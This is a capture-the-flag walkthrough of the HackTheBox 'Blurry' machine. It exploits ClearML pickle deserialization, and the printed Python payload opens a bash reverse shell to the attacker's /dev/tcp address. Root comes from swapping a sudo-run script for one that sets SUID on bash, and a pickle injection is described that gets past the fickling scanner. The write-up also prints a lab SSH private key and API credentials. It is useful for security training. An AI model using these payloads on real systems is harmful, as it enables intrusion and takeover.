---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - ClearML
  - CICD
  - Subdomain
  - PythonPickle
  - PythonPickleDeserialization
  - sudo
  - PyTorch
---

![](images/Blurry.png)

## Summary

The box redirects you to `http://app.blurry.htb` which contains an instance of `ClearML`. By entering a random username, you get access to the dashboard and can setup your local testing environment using `clearml-cli`. After you find some information about potential vulnerabilities like `Python Pickle Deserialization` you can use a `Proof of Concept (PoC)` code and editing to execute whatever payload you put in as a `serialized artifact` when the jobs is running. This grants you a `reverse shell` as `jippity` and you can grab the `user.txt`. For persistence and to get a proper shell you can use the `SSH key` in the users `.ssh` directory. For `privilege escalation` have a look on the users `sudo capabilities`. The user can execute `.pth` files within the `/models` directory using a script called `evaluate_model`. But the user has permission to delete any file in the `/models` folder so you can just place your own malicious `evaluate_model` file there and execute the command with `sudo` using the `demo_model.pth` in the same directory.

## Table of Contents

- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port80TCP)
    - [Subdomain Enumeration](#Subdomain-Enumeration)
- [Foothold](#Foothold)
- [user.txt](#usertxt)
- [Persistence](#Persistence)
- [Enumeration](#Enumeration)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
- [root.txt](#roottxt)

## Reconnaissance

### Port Scanning

The box only had `two open ports` and for the foothold, only port `80/TCP` was relevant.

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.3.141
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-08 15:03 EDT
Nmap scan report for 10.129.3.141
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://app.blurry.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

### Enumeration of Port 80/TCP

As usual we started with enumeration of the website.

- [http://10.129.3.141/](http://10.129.3.141/)

We got redirected to `app.blurry.htb` and added this to our `/etc/hosts` file as well as just `blurry.htb`.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.3.141    blurry.htb
10.129.3.141    app.blurry.htb
```

- [http://app.blurry.htb/](http://app.blurry.htb/)

As we looked at the website we immediately saw `ClearML` which also was found by `WhatWeb`.

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://app.blurry.htb/
http://app.blurry.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.129.3.141], Script[module], Title[ClearML], nginx[1.18.0]
```

After entering a random `username` we got redirected to the `dashboard`.

![](images/2024-06-08_15-18_website.png)

- [https://github.com/allegroai/clearml](https://github.com/allegroai/clearml)

![](images/2024-06-08_15-19_dashboard.png)

From the `dashboard` we investigated the `Black Swan` example project and found a potential `username` in the `console output` of a `failed job`.

![](images/2024-06-08_15-26_console_log.png)

| Username |
| -------- |
| jippity  |

### Subdomain Enumeration

Since we had a web server publishing the `ClearML` application on a `domain name` we went for `subdomain enumeration` to find more potential subdomains.

```c
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.blurry.htb" -u http://blurry.htb --fs 169 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://blurry.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.blurry.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 169
________________________________________________

app                     [Status: 200, Size: 13327, Words: 382, Lines: 29, Duration: 19ms]
files                   [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 1030ms]
chat                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 426ms]
:: Progress: [114441/114441] :: Job [1/1] :: 44 req/sec :: Duration: [0:13:24] :: Errors: 8 ::
```

Someone also found `api` on the main page. We added `chat, files and api` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.3.141    blurry.htb
10.129.3.141    app.blurry.htb
10.129.3.141    api.blurry.htb
10.129.3.141    chat.blurry.htb
10.129.3.141    files.blurry.htb
```

Basically all of the subdomains weren't needed and probably just placed as rabbit holes.

![](images/2024-06-08_15-21_api.png)

![](images/2024-06-08_15-21_files.png)

![](images/2024-06-08_15-29_chat.png)

![](images/2024-06-08_15-32_chat_dashboard.png)

The only relevant thing to mention is probably the `chat history` in the `RocketChat` application which could show the `username` we found earlier.

![](images/2024-06-08_15-33_chat_general.png)

## Foothold

The version of `ClearML` had several `security issues` and `vulnerabilities`. We focused on the `deserialization` through `artifacts` from the article below.

- [https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/](https://hiddenlayer.com/research/not-so-clear-how-mlops-solutions-can-muddy-the-waters-of-your-supply-chain/)

At first we created a `custom project` to get our `clearml-cli` ready and to get a feeling how the application behaves.

![](images/2024-06-08_15-38_clearml.png)

```c
┌──(kali㉿kali)-[/media/…/Machines/Blurry/files/project]
└─$ clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
```

![](images/2024-06-08_15-39_clearml_configuration.png)

```c
┌──(kali㉿kali)-[/media/…/Machines/Blurry/files/project]
└─$ clearml-init
ClearML SDK setup process

Please create new clearml credentials through the settings page in your `clearml-server` web app (e.g. http://localhost:8080//settings/workspace-configuration) 
Or create a free account at https://app.clear.ml/settings/workspace-configuration

In settings page, press "Create new credentials", then press "Copy to clipboard".

Paste copied configuration here:
api {
  web_server: http://app.blurry.htb
  api_server: http://api.blurry.htb
  files_server: http://files.blurry.htb
  credentials {
    "access_key" = "W332WDC5YJ5JVIQLGMZ2"
    "secret_key" = "6gfW3lgKzd2buKB7nQ1cvi55ywHmtTn58Or3Up8JSz9Bd03LR0"
  }
}
Detected credentials key="W332WDC5YJ5JVIQLGMZ2" secret="6gfW***"

ClearML Hosts configuration:
Web App: http://app.blurry.htb
API: http://api.blurry.htb
File Store: http://files.blurry.htb

Verifying credentials ...
Credentials verified!

New configuration stored in /home/kali/clearml.conf
ClearML setup completed successfully.
```

Then we investigated the `automated task` which ran every few minutes. We noticed that any action required the tag `review` to match the condition.

```c
#!/usr/bin/python3

from clearml import Task
from multiprocessing import Process
from clearml.backend_api.session.client import APIClient

def process_json_artifact(data, artifact_name):
    """
    Process a JSON artifact represented as a Python dictionary.
    Print all key-value pairs contained in the dictionary.
    """
    print(f"[+] Artifact '{artifact_name}' Contents:")
    for key, value in data.items():
        print(f" - {key}: {value}")

def process_task(task):
    artifacts = task.artifacts
    
    for artifact_name, artifact_object in artifacts.items():
        data = artifact_object.get()
        
        if isinstance(data, dict):
            process_json_artifact(data, artifact_name)
        else:
            print(f"[!] Artifact '{artifact_name}' content is not a dictionary.")

def main():
    review_task = Task.init(project_name="Black Swan", 
                            task_name="Review JSON Artifacts", 
                            task_type=Task.TaskTypes.data_processing)

    # Retrieve tasks tagged for review
    tasks = Task.get_tasks(project_name='Black Swan', tags=["review"], allow_archived=False)

    if not tasks:
        print("[!] No tasks up for review.")
        return
    
    threads = []
    for task in tasks:
        print(f"[+] Reviewing artifacts from task: {task.name} (ID: {task.id})")
        p = Process(target=process_task, args=(task,))
        p.start()
        threads.append(p)
        task.set_archived(True)

    for thread in threads:
        thread.join(60)
        if thread.is_alive():
            thread.terminate()

    # Mark the ClearML task as completed
    review_task.close()

def cleanup():
    client = APIClient()
    tasks = client.tasks.get_all(
        system_tags=["archived"],
        only_fields=["id"],
        order_by=["-last_update"],
        page_size=100,
        page=0,
    )

    # delete and cleanup tasks
    for task in tasks:
        # noinspection PyBroadException
        try:
            deleted_task = Task.get_task(task_id=task.id)
            deleted_task.delete(
                delete_artifacts_and_models=True,
                skip_models_used_by_other_tasks=True,
                raise_on_error=False
            )
        except Exception as ex:
            continue

if __name__ == "__main__":
    main()
    cleanup()

```

We created an `empty` sample file of `requirements.txt` and uploaded some random code.

```c
┌──(kali㉿kali)-[/media/…/Machines/Blurry/files/project]
└─$ vi requirements.txt
```

```c
┌──(kali㉿kali)-[/media/…/Machines/Blurry/files/project]
└─$ clearml-task --name foobar --script project.py --queue default --project 'Project' --requirements requirements.txt
ClearML launch - launch any codebase on remote machine running clearml-agent
Creating new task
Standalone script detected
  Script: project.py
Base docker image: {'image': None, 'args': None, 'bash_script': None}
New task created id=8c8604cdac2448c2bc9b1d8bcaf35f35
Task id=8c8604cdac2448c2bc9b1d8bcaf35f35 sent for execution on queue default
Execution log at: http://app.blurry.htb/projects/3d63ceb1548c4ec49baea1119c778988/experiments/8c8604cdac2448c2bc9b1d8bcaf35f35/output/log
```

- [http://app.blurry.htb/projects/3d63ceb1548c4ec49baea1119c778988/experiments/8c8604cdac2448c2bc9b1d8bcaf35f35/output/log](http://app.blurry.htb/projects/3d63ceb1548c4ec49baea1119c778988/experiments/8c8604cdac2448c2bc9b1d8bcaf35f35/output/log)

![](images/2024-06-08_15-46_project_review.png)

To gain `foothold` we used the `Proof of Concept (PoC)` from the article mentioned earlier and replaced the `artifact` within `artifact_object` with `command` to execute the `serialized code` in the `RunCommand class`.

```c
┌──(kali㉿kali)-[/media/…/Machines/Blurry/files/project]
└─$ cat shell.py 
#!/usr/bin/python3

import pickle
import os

class RunCommand:
    def __reduce__(self):
        return ( os.system, ("bash -c 'exec bash -i >& /dev/tcp/10.10.14.48/9002 0>&1'",) )

command = RunCommand()

with open('netcat.pkl', 'wb') as f:
    pickle.dump(command, f)

from clearml import Task
task = Task.init(project_name='Black Swan', task_name='foobar')
task.add_tags("review")

task.upload_artifact(name='artifact', artifact_object=command, retries=2, wait_on_upload=True, extension_name=".pkl", )

```

Executing the modified script which automatically added the `review tag` granted us a shell after a few seconds.

```c
┌──(kali㉿kali)-[/media/…/Machines/Blurry/files/project]
└─$ python3 test.py 
ClearML Task: created new task id=63e001270cd0494cb18578a484a43153
ClearML results page: http://app.blurry.htb/projects/116c40b9b53743689239b6b460efd7be/experiments/63e001270cd0494cb18578a484a43153/output/log
2024-06-08 16:55:28,869 - clearml.Task - INFO - No repository found, storing script code instead
ClearML Monitor: GPU monitoring failed getting GPU reading, switching off GPU monitoring
```

```c
┌──(kali㉿kali)-[/media/…/notes/HTB/Machines/Blurry]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.48] from (UNKNOWN) [10.129.3.141] 40140
bash: cannot set terminal process group (6593): Inappropriate ioctl for device
bash: no job control in this shell
jippity@blurry:~$
```

## user.txt

We got a shell as the user `jippity` which we found earlier and could grab the `user.txt`.

```c
jippity@blurry:~$ cat user.txt
cat user.txt
ee4ac75b198f7ce8f5185672f5b1415f
```

## Persistence

Conveniently the user had an `SSH key` placed in it's `.ssh` folder.

```c
jippity@blurry:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAxxZ6RXgJ45m3Vao4oXSJBFlk9skeIQw9tUWDo/ZA0WVk0sl5usUV
KYWvWQOKo6OkK23i753bdXl+R5NqjTSacwu8kNC2ImqDYeVJMnf/opO2Ke5XazVBKWgByY
8qTrt+mWN7GKwtdfUqXNcdbJ7MGpzhnk8eYF+itkPFD0AcYfSvbkCc1SY9Mn7Zsp+/jtgk
FJsve7iqONPRlgvUQLRFRSUyPyIp2sGFEADuqHLeAaHDqU7uh01UhwipeDcC3CE3QzKsWX
SstitvWqbKS4E5i9X2BB56/NlzbiLKVCJQ5Sm+BWlUR/yGAvwfNtfFqpXG92lOAB4Zh4eo
7P01RInlJ0dT/jm4GF0O+RDTohk57l3F3Zs1tRAsfxhnd2dtKQeAADCmmwKJG74qEQML1q
6f9FlnIT3eqTvfguWZfJLQVWv0X9Wf9RLMQrZqSLfZcctxNI1CVYIUbut3x1H53nARfqSz
et/r/eMGtyRrY3cmL7BUaTKPjF44WNluj6ZLUgW5AAAFiH8itAN/IrQDAAAAB3NzaC1yc2
EAAAGBAMcWekV4CeOZt1WqOKF0iQRZZPbJHiEMPbVFg6P2QNFlZNLJebrFFSmFr1kDiqOj
pCtt4u+d23V5fkeTao00mnMLvJDQtiJqg2HlSTJ3/6KTtinuV2s1QSloAcmPKk67fpljex
isLXX1KlzXHWyezBqc4Z5PHmBforZDxQ9AHGH0r25AnNUmPTJ+2bKfv47YJBSbL3u4qjjT
0ZYL1EC0RUUlMj8iKdrBhRAA7qhy3gGhw6lO7odNVIcIqXg3AtwhN0MyrFl0rLYrb1qmyk
uBOYvV9gQeevzZc24iylQiUOUpvgVpVEf8hgL8HzbXxaqVxvdpTgAeGYeHqOz9NUSJ5SdH
U/45uBhdDvkQ06IZOe5dxd2bNbUQLH8YZ3dnbSkHgAAwppsCiRu+KhEDC9aun/RZZyE93q
k734LlmXyS0FVr9F/Vn/USzEK2aki32XHLcTSNQlWCFG7rd8dR+d5wEX6ks3rf6/3jBrck
a2N3Ji+wVGkyj4xeOFjZbo+mS1IFuQAAAAMBAAEAAAGANweUho02lo3PqkMh4ib3FJetG7
XduR7ME8YCLBkOM5MGOmlsV17QiailHkKnWLIL1+FI4BjPJ3qMmDY8Nom6w2AUICdAoOS2
KiIZiHS42XRg3tg9m6mduFdCXzdOZ3LV/IoN5XT6H+fDbOQdAwAlxJlml76g09y7egvjdW
KwNbdPoncDorsuIT4E6KXVaiN+XZ/DkTwq+Qg7n3Dnm3b4yrMMX30O+qORJypKzY7qpKLV
FYB22DlcyvJu/YafKL+ZLI+MW8X/rEsnlWyUzwxq93T67aQ0Nei8amO6iFzztfXiRsi4Jk
nKVuipAshuXhK1x2udOBuKXcT5ziRfeBZHfSUPyrbUbaoj/aGsg59GlCYPkcYJ1yDgLjIR
bktd7N49s5IccmZUEG2BuXLzQoDdcxDMLC3rxiNGgjA1EXe/3DFoukjGVOYxC0JbwSC1Pb
9m30zrxSJCxW7IOWWWrSgnc8EDpxw+W5SmVHRCrf+8c39rFdV5GLPshaDGWW5m9NzxAAAA
wFsqI1UWg9R9/afLxtLYWlLUrupc/6/YBkf6woRSB76sku839P/HDmtV3VWl70I5XlD+A9
GaNVA3XDTg1h3WLX/3hh8eJ2vszfjG99DEqPnAP0CNcaGJuOsvi8zFs7uUB9XWV8KYJqy2
u4RoOAhAyKyeE6JIsR8veN898bKUpuxPS2z6PElZk+t9/tE1oyewPddhBGR5obIb+UV3tp
Cm1D8B3qaG1WwEQDAPQJ/Zxy+FDtlb1jCVrmmgvCj8Zk1qcQAAAMEA9wFORKr+WgaRZGAu
G9PPaCTsyaJjFnK6HFXGN9x9CD6dToq/Li/rdQYGfMuo7DME3Ha2cda/0S7c8YPMjl73Vb
fvGxyZiIGZXLGw0PWAj58jWyaqCdPCjpIKsYkgtoyOU0DF0RyEOuVgiCJF7n24476pLWPM
n8sZGfbOODToas3ZCcYTSaL6KCxF41GCTGNP1ntD7644vZejaqMjWBBhREU2oSpZNNrRJn
afU7OhUtfvyfhgLl2css7IWd8csgVdAAAAwQDOVncInXv2GYjzQ21YF26imNnSN6sq1C9u
tnZsIB9fAjdNRpSMrbdxyED0QCE7A6NlDMiY90IQr/8x3ZTo56cf6fdwQTXYKY6vISMcCr
GQMojnpTxNNMObDSh3K6O8oM9At6H6qCgyjLLhvoV5HLyrh4TqmBbQCTFlbp0d410AGCa7
GNNR4BXqnM9tk1wLIFwPxKYO6m2flYUF2Ekx7HnrmFISQKravUE1WZjfPjEkTFZb+spHa1
RGR4erBSUqwA0AAAAOamlwcGl0eUBibHVycnkBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Blurry/files]
└─$ chmod 600 jippity_id_rsa
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Blurry/files]
└─$ ssh -i jippity_id_rsa jippity@blurry.htb
The authenticity of host 'blurry.htb (10.129.3.141)' can't be established.
ED25519 key fingerprint is SHA256:Yr2plP6C5tZyGiCNZeUYNDmsDGrfGijissa6WJo0yPY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'blurry.htb' (ED25519) to the list of known hosts.
Linux blurry 5.10.0-30-amd64 #1 SMP Debian 5.10.218-1 (2024-06-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu May 30 03:55:55 2024 from 10.10.14.40
jippity@blurry:~$
```

## Enumeration

A quick look on it's `permissions` and `capabilities` like `sudo`, showed that he was able to execute `*.pth` files in `/models` using `/usr/bin/evaluate_model`.

```c
jippity@blurry:~$ id
uid=1000(jippity) gid=1000(jippity) groups=1000(jippity)
```

```c
jippity@blurry:~$ sudo -l
Matching Defaults entries for jippity on blurry:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

## Privilege Escalation to root

First we checked the file `evaluate_model` and played around with it for a bit.

```c
jippity@blurry:~$ cat /usr/bin/evaluate_model
#!/bin/bash
# Evaluate a given model against our proprietary dataset.
# Security checks against model file included.

if [ "$#" -ne 1 ]; then
    /usr/bin/echo "Usage: $0 <path_to_model.pth>"
    exit 1
fi

MODEL_FILE="$1"
TEMP_DIR="/models/temp"
PYTHON_SCRIPT="/models/evaluate_model.py"  

/usr/bin/mkdir -p "$TEMP_DIR"

file_type=$(/usr/bin/file --brief "$MODEL_FILE")

# Extract based on file type
if [[ "$file_type" == *"POSIX tar archive"* ]]; then
    # POSIX tar archive (older PyTorch format)
    /usr/bin/tar -xf "$MODEL_FILE" -C "$TEMP_DIR"
elif [[ "$file_type" == *"Zip archive data"* ]]; then
    # Zip archive (newer PyTorch format)
    /usr/bin/unzip -q "$MODEL_FILE" -d "$TEMP_DIR"
else
    /usr/bin/echo "[!] Unknown or unsupported file format for $MODEL_FILE"
    exit 2
fi

/usr/bin/find "$TEMP_DIR" -type f \( -name "*.pkl" -o -name "pickle" \) -print0 | while IFS= read -r -d $'\0' extracted_pkl; do
    fickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 "$extracted_pkl")

    if /usr/bin/echo "$fickling_output" | /usr/bin/jq -e 'select(.severity == "OVERTLY_MALICIOUS")' >/dev/null; then
        /usr/bin/echo "[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted."
        /bin/rm "$MODEL_FILE"
        break
    fi
done

/usr/bin/find "$TEMP_DIR" -type f -exec /bin/rm {} +
/bin/rm -rf "$TEMP_DIR"

if [ -f "$MODEL_FILE" ]; then
    /usr/bin/echo "[+] Model $MODEL_FILE is considered safe. Processing..."
    /usr/bin/python3 "$PYTHON_SCRIPT" "$MODEL_FILE"
    
fi
```

Until we noticed that we had `permissions` on the `directory` not to `modify`, but to `delete` any file within.

```c
jippity@blurry:/models$ ls -la
total 1068
drwxrwxr-x  2 root    jippity    4096 Jun  8 18:12 .
drwxr-xr-x 19 root    root       4096 Jun  3 09:28 ..
-rw-r--r--  1 root    root    1077880 May 30 04:39 demo_model.pth
-rw-r--r--  1 jippity jippity      66 Jun  8 18:11 evaluate_model.py
```

```c
drwxrwxr-x  2 root    jippity    4096 Jun  8 18:12 .
```

We deleted `evaluate_model` and placed our own file with our payload to set the `SUID bit` on `/bin/bash`.

```c
jippity@blurry:/models$ cat evaluate_model.py 
import os

# Execute the command
os.system('chmod u+s /bin/bash')
```

Then we reused the `demo_model.pth` and executed the command using `sudo`.

```c
jippity@blurry:/models$ sudo /usr/bin/evaluate_model /models/demo_model.pth
[+] Model /models/demo_model.pth is considered safe. Processing...
```

```c
jippity@blurry:/models$ /bin/bash -p
bash-5.1#
```

### Weaponizing ML Models with Ransomware
That should be the intended way. 
* https://hiddenlayer.com/research/weaponizing-machine-learning-models-with-ransomware/#Pickle-Code-Injection-POC
This blog post contains all the necessary information and the script we used.

1. Make the torch_picke_inject.py in /dev/shm
2. Move the /models/demo_model.pth to /dev/shm
3. Run `python3 torch_picke_inject.py demo_model.pth runpy "import os; os.system('chmod u+s /bin/bash')"`
4. Now move the file demo_model.pth back to /models
5. Run `sudo /usr/bin/evaluate_model /models/*.pth`
   
This works because the runpy._run_code approach is currently undetected so exec or system failed. 

## root.txt

```c
bash-5.1# cat /root/root.txt
9e1caed85c602c3f6572f84cabe56425
```
